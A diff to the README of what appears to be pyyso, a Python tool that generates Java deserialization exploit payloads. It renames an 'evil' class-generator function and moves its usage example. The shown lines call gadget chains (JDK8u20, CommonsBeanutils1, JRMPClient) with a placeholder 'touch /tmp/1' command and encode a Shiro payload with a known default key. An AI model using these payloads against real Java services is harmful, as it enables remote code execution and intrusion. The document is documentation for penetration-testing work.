@@ -56,6 +56,10 @@ pyyso.jdk8u20("touch /tmp/1") #return java serialzed data of JDK8u20 in bytes
 pyyso.jrmpclient("127.0.0.1",80) #return java serialzed data of jrmpclient in bytes
 pyyso.cb1v183("touch /tmp/1") #return java serialzed data of CommonsBeanutils1 1.8.3 no cc in bytes
 ```
+To generate a java class embed with command use:
+```python
+pyyso.clazz("touch /tmp/1") #return java class embed with command in bytes
+```
 ### shiro 
 
 To encode a shiro poc use:
@@ -63,10 +67,6 @@ To encode a shiro poc use:
 ```python
 serobj=pyyso.cb1v183("touch /tmp/1")
 pyyso.shiroEncode(serobj=serobj,key=b'kPH+bIxk5D2deZiIxcaaaA==')
-```
-To generate a java class embed with command use:
-```python
-pyyso.evil("touch /tmp/1") #return java class embed with command in bytes
 ```
 ### LDAP
 
